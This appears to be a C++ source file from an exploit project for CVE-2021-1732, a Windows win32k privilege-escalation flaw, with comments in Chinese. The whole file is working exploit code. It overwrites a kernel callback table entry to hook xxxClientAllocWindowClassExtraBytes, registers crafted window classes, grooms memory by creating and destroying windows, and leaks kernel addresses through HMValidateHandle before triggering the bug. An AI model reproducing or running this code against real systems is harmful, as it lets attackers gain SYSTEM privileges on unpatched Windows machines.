#include "include/core/exp.hpp"

namespace CVE_2021_1732
{
    bool Exp() {

        if (!initAPI())
            return false;

        // 进行hook user!xxxClientAllocWindowClassExtraBytes
        auto pPEB = __readgsqword(0x60);
        auto pKernelCallbackTable = *(PULONG_PTR*)(pPEB + 0x58);
        orign_xxxClientAllocWindowClassExtraBytes = (FxxxClientAllocWindowClassExtraBytes)pKernelCallbackTable[123];
        printf("[+] Kernel Callback Table at: 0x%p\n[+] user!xxxClientAllocWindowClassExtraBytes at 0x%p\n[+] New MyxxxClientAllocWindowClassExtraBytes: 0x%p\n", pKernelCallbackTable, orign_xxxClientAllocWindowClassExtraBytes, MyxxxClientAllocWindowClassExtraBytes);
        DWORD oldProtect;
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
        pKernelCallbackTable[123] = reinterpret_cast<ULONG_PTR>(MyxxxClientAllocWindowClassExtraBytes);
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, oldProtect, &oldProtect);


        // 注册两种类别的窗口类
        WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"TypeA", nullptr };
        wc.cbSize = sizeof(WNDCLASSEX);
        wc.cbWndExtra = sizeof(LONG_PTR);

        auto atom1 = ::RegisterClassExW(&wc);
        wc.lpszClassName = L"TypeB";
        wc.cbWndExtra = magicExtra;
        auto atom2 = ::RegisterClassExW(&wc);

        for (size_t i = 0; i < 0x20; i++)
        {
            HWND temp = CreateWindowExW(0, L"TypeA", L"wndexp",
                CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
                CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
            g_HWNDs.push_back(temp);
            PVOID tempPVoid = HMValidateHandle(temp, 1);
            g_HWNDKs.push_back(tempPVoid);
            // printf("[+] created %x at tagWNDK: %p\n", temp, tempPVoid);
        }
        for (size_t i = 2; i < 0x20; i++) {
            DestroyWindow(g_HWNDs[i]);
        }

        CreateWindowExW(0, L"TypeB", L"wndexp",
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
            CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
        printf("[+] HWND value: 0x%x\n", choosenOne);


        return true;
    }
} // namespace CVE_2021_1732